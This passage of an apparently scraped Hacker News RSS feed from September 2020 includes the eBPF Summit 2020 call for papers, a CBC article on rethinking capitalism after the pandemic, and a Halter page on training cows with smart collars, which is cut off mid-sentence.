src="data:image/png;base64,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" alt="Zang Li"></p><h3>Zang Li</h3><div><p>Cilium Core Team Maintainer,</p><p>Google</p></div></div></div></div><div><div><div><h2>eBPF User Lightning Talks</h2><p>Users are invited to submit talks describing how they are using eBPF and eBPF-based open source projects to solve real world problems. To be clear, you do not have to be writing raw eBPF programs yourself to speak, we expect many speakers to be leveraging eBPF via derivative projects (see list <a href="https://ebpf.io/projects">here</a>). Lightning talks will be 5 minutes in length (plus time for Q&amp;A) and can be pre-recorded or delivered live based on the speaker‚Äôs preference. We do ask that regardless of the delivery that the speaker is present to answer questions and interact with the community.</p></div><div><h2>Dates to Remember</h2><div><h4>CFP Opens: </h4><p>Wednesday, September 23</p><h4>Registration opens:</h4><p>Wednesday, September 23</p><h4>CFP Closes: </h4><p>Wednesday, October 14 at 11:59 <strong>PDT</strong></p><h4>CFP Notifications: </h4><p>on or before Friday, October 16</p><h4>Session Recordings Completed: </h4><p>Sunday, October 25th at 11:59 <strong>PDT</strong></p><h4>Event Date:</h4><p>October 28 and 29th, 2020,<br>9am-12pm <strong>PDT</strong> / 4pm-7pm <strong>GMT</strong></p></div></div></div><div><div><h2>Suggested Topics</h2><ul><li>Using eBPF to troubleshoot application and system performance</li><li>Applying eBPF to implement zero trust, runtime security, network policy</li><li>Tackling infrastructure scalability challenges with eBPF</li><li>Applying eBPF to networking and load-balancing</li><li>Application profiling and tracing with eBPF</li><li>System and application monitoring with eBPF</li><li>Unlocking new levels of observability with eBPF</li><li>Advancements in the eBPF core infrastructure and libraries</li><li>eBPF community related topics</li></ul></div><div><h2>Registration</h2><p>The summit is open to everyone free of charge. To sign up for the event, please fill out this <a href="https://docs.google.com/forms/d/e/1FAIpQLSeWBrtQzSDxgFb2yMoa2tePapMibKeGaHLHDd70xNJzzVMX5g/viewform?embedded=true">Registration Form</a>. You will receive information on how to join the summit prior to the event.</p><p>If you have any questions please ask them on <a href="https://cilium.herokuapp.com/">the eBPF Slack</a>. There is a #ebpf-summit channel dedicated for this event.</p></div></div></div></div></div></div></div></div></div>]]>
            </description>
            <link>https://ebpf.io/ebpf-summit-2020-cfp/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577647</guid>
            <pubDate>Thu, 24 Sep 2020 11:48:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Polis: real-time system for gathering, analyzing and understanding large groups]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577640">thread link</a>) | @searchableguy
<br/>
September 24, 2020 | https://pol.is/home | <a href="https://web.archive.org/web/*/https://pol.is/home">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://pol.is/home</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577640</guid>
            <pubDate>Thu, 24 Sep 2020 11:47:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Compasses [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577592">thread link</a>) | @082349872349872
<br/>
September 24, 2020 | http://sync.abue.io/issues/190705ap_sync2_27_compasses.pdf | <a href="https://web.archive.org/web/*/http://sync.abue.io/issues/190705ap_sync2_27_compasses.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://sync.abue.io/issues/190705ap_sync2_27_compasses.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577592</guid>
            <pubDate>Thu, 24 Sep 2020 11:41:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Going Dark: Looking for the End of the Internet, Part 3: The Gemini Project]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577554">thread link</a>) | @sT370ma2
<br/>
September 24, 2020 | https://cheapskatesguide.org/articles/gemini.html | <a href="https://web.archive.org/web/*/https://cheapskatesguide.org/articles/gemini.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://cheapskatesguide.org/articles/gemini.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577554</guid>
            <pubDate>Thu, 24 Sep 2020 11:35:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pandemic recovery will require rethinking capitalist norms, expert says]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577476">thread link</a>) | @pseudolus
<br/>
September 24, 2020 | https://www.cbc.ca/radio/spark/pandemic-uncertainty-may-actually-be-good-for-your-brain-neuroscientist-explains-1.5729572/pandemic-recovery-will-require-rethinking-capitalist-norms-expert-says-1.5729646 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/radio/spark/pandemic-uncertainty-may-actually-be-good-for-your-brain-neuroscientist-explains-1.5729572/pandemic-recovery-will-require-rethinking-capitalist-norms-expert-says-1.5729646">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Rather than planning COVID-19 economic recoveries around old capitalist norms, one business-world advisor believes that global enterprises need to take steps to re-invent their approach to capitalism by taking steps to combat growing inequality.&nbsp;</p><div><figure><div><p><img alt="" srcset="" sizes="" src="https://i.cbc.ca/1.4827731.1537238348!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/frontpagetapestrycapitalism.jpg"></p></div><figcaption>Money might make the world go round, but one expert believes it's possible to ensure profit while maintaining social responsibility. <!-- --> </figcaption></figure><p><span></span><span>Listen</span><span>25:01</span></p><p><span><p>Rather than planning COVID-19 economic recoveries around old capitalist norms, one business advisor believes that global enterprises need to re-invent their approach to capitalism by taking steps to combat growing inequality.&nbsp;</p>  <p>"Recent research actually shows that whatever wealth was created in the last 12 months went to the top one per cent of Americans, for example," said Navi Radjou, an innovation and leadership advisor based in New York City, during an interview with <em>Spark</em> host Nora Young. "This is why I think we have to ask ourselves ‚Ä¶ what is normal? If the normal is actually dysfunctional, why are we trying to resuscitate a sick patient?"&nbsp;</p>  <p>As Radjou sees it, capitalism has created widespread social inequality and contributed to considerable environmental degradation through the effects of human-induced climate change, as well as through the economic and social system's emphasis on short-term gains and individualistic competition.</p>  <p>"It's about winning all the time," he said. "And the notion of cooperation, you rarely hear in corporate America. It's always about competing and winning."&nbsp;</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5729668.1600445124!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/spark-navi-radjou.jpg 300w,https://i.cbc.ca/1.5729668.1600445124!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/spark-navi-radjou.jpg 460w,https://i.cbc.ca/1.5729668.1600445124!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/spark-navi-radjou.jpg 620w,https://i.cbc.ca/1.5729668.1600445124!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/spark-navi-radjou.jpg 780w,https://i.cbc.ca/1.5729668.1600445124!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/spark-navi-radjou.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5729668.1600445124!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/spark-navi-radjou.jpg"></p></div><figcaption>Innovation and leadership advisor Navi Radjou says some companies are already rethinking their approach to conventional capitalism.<!-- --> <!-- -->(Submitted by Navi Radjou)</figcaption></figure></span></p>  <p>Radjou acknowledged that capitalism has enabled increases in overall comfort of living and has also contributed to increases in material prosperity across the world, but he said capitalist reforms need to centre around the creation of a "sense of purpose."</p>  <p>"Right now, the purpose is just about making money," he said. "Instead of that, we should broaden the scope of capitalism and say ‚Ä¶ we could simultaneously create economic value and we can create social value and we can create ecological value as well."</p>  <p>According to Radjou, companies like the European multinational food conglomerate Danone ‚Äî as well as smaller companies, like U.S-based commercial flooring giant Interface ‚Äî are among those that have already taken steps to maintain their existing capitalist leanings, while simultaneously attempting to improve their social impact.&nbsp;</p>  <p>"People call it conscious capitalism or regenerative capitalism," he said.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.1897809.1380860185!/httpImage/image.jpg_gen/derivatives/original_300/hi-danoneyogurt-852-8col.jpg 300w,https://i.cbc.ca/1.1897809.1380860185!/httpImage/image.jpg_gen/derivatives/original_460/hi-danoneyogurt-852-8col.jpg 460w,https://i.cbc.ca/1.1897809.1380860185!/httpImage/image.jpg_gen/derivatives/original_620/hi-danoneyogurt-852-8col.jpg 620w,https://i.cbc.ca/1.1897809.1380860185!/httpImage/image.jpg_gen/derivatives/original_780/hi-danoneyogurt-852-8col.jpg 780w,https://i.cbc.ca/1.1897809.1380860185!/httpImage/image.jpg_gen/derivatives/original_1180/hi-danoneyogurt-852-8col.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.1897809.1380860185!/httpImage/image.jpg_gen/derivatives/original_780/hi-danoneyogurt-852-8col.jpg"></p></div><figcaption>Known for its line of dairy products, European food giant Danone is also drawing attention for its sustainable environmental and economic practices. <!-- --> <!-- -->(Radio-Canada)</figcaption></figure></span></p>  <p>Danone, Radjou pointed out, invests in regenerative agriculture, which enables the company's U.S. farmers to "enrich their soil, preserve biodiversity, as well as improve animal welfare," all while signing fixed, long-term contracts that maintain a steady income for the company's producers.&nbsp;</p>  <p>"This is an approach that Danone has been using for the last couple of years," he said.</p>  <p>Interface, according to Radjou, has spent the last two decades taking steps to reduce the company's overall carbon footprint and is even working on launching new carbon negative carpet tiles.&nbsp;</p>  <h2>Possible to increase profit while increasing positive social impacts</h2>  <p>While some might argue that companies need to maintain existing capitalist structures to ensure continued material prosperity, Radjou argued that it's actually in a company's best economic interest to adhere to <a href="https://sloanreview.mit.edu/article/the-rising-frugal-economy/" target="_blank">frugal economic principles</a>.</p>  <p>"The frugal economy essentially is an economy that reduces the huge gap that exists right now between supply and demand along four dimensions: Time, distance, trust and values," he said.&nbsp;</p>  <p>In effect, by reducing the gap between supply and demand, not only are companies able to save on costs, they're also able to better service consumers ‚Äî especially the section of consumers that Radjou calls "value and values conscious."</p>  <p><span><span><iframe src="https://www.youtube.com/embed/H5kORRhmM10" frameborder="no" title="YouTube content" allowfullscreen=""></iframe></span></span></p>  <p>"Especially millennials [and] Gen Z, who are now almost 40 to 50 per cent of the global consumer-base, they're essentially voting with their [wallets]," he said. "They are actually asking for brands that are actually socially and environmentally conscious. So they are willing to even pay extra for those brands that have strong social and environmental credentials."&nbsp;</p>  <p>Though it might seem utopian, Radjou said he's hopeful because of changes he's seeing in global consumers, as well as the investor community, who are slowly demanding more responsible business practices.&nbsp;</p>  <p>"Even in some cases some shareholder communities ‚Ä¶ are putting pressure on companies to do the right thing for society and the planet."</p>    <p>At the same time, Radjou said even some government institutions ‚Äî like those in Europe ‚Äî are "heaping" pressure on companies to take steps to be more socially conscious.&nbsp;</p>  <p>"All studies show that if companies invest in societal and ecological [initiatives], it has a direct impact on [a company's] bottom line and the top line," he said.&nbsp;</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/radio/spark/pandemic-uncertainty-may-actually-be-good-for-your-brain-neuroscientist-explains-1.5729572/pandemic-recovery-will-require-rethinking-capitalist-norms-expert-says-1.5729646</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577476</guid>
            <pubDate>Thu, 24 Sep 2020 11:21:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Smart Cow Collars]]>
            </title>
            <description>
<![CDATA[
Score 68 | Comments 57 (<a href="https://news.ycombinator.com/item?id=24577468">thread link</a>) | @troydavis
<br/>
September 24, 2020 | https://halterhq.com/smart-cow-collars | <a href="https://web.archive.org/web/*/https://halterhq.com/smart-cow-collars">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-ca2563ba93dc6cf1ddae"><div><p>Shift, manage and monitor your herd remotely - we‚Äôve summed it up fairly concisely, but how we do that may require a little more paper and a sharpening of the pencil. How are we able to shift a cow to and from the milk shed with the click of a button? Essentially, we train cows to respond to sensory cues which help them understand where they can and cannot go, a method based on the theory of Pavlovian Conditioning. Now, it‚Äôs likely your list of questions is long, so we‚Äôve brought in our Head of Rural, Chris, who oversees all on farm training to give you some answers.</p><p><strong>You say that you use sensory cues to guide cows‚Ä¶ how does that work?</strong></p><p>Like any animal, cows learn behaviours through the use of positive and negative reinforcement. This technique is commonly known as Pavlovian Conditioning, whereby certain stimuli such as sounds, touches and smells are paired with a conditioned response in order to elicit a desired behaviour.</p><p>If you think about the way we farm today, farmers use a multitude of different cues to shift cows or keep them in a particular zone. To put it really simply, Halter replicates these cues and places them on a collar in the form of sound and vibration. </p><p>Vibration can be seen as a positive reinforcer, enabling us to shift cows around the farm as well as indicating to a cow that she is moving in the right direction. You might like to think of vibration as a farmer walking behind their cows to shift them up to the shed! Sound on the other hand helps a cow understand she is moving in the wrong direction or outside of the allocated zone. Currently on the farm an electric fence is the only real means available for farmers to keep their cows within a particular boundary; we instead use sound to replicate a fence line with a pulse used during the initial training period to help a cow understand the meaning of sound. Once the girls are trained we combine sound cues with vibration and we have the ability to guide cows around a farm, keep them out of waterways and set up virtual paddocks and break fences.</p><p><strong>How quick is the training process? Do all cows learn or do some just not get it?&nbsp;</strong></p><p>Cows are extremely quick to respond to sound, within a couple hours of wearing a collar cows learn to stay within a static boundary. It takes a little longer for them to associate vibration with positive cues, however we are currently seeing this happen within a week. In general onboarding takes a week, however this 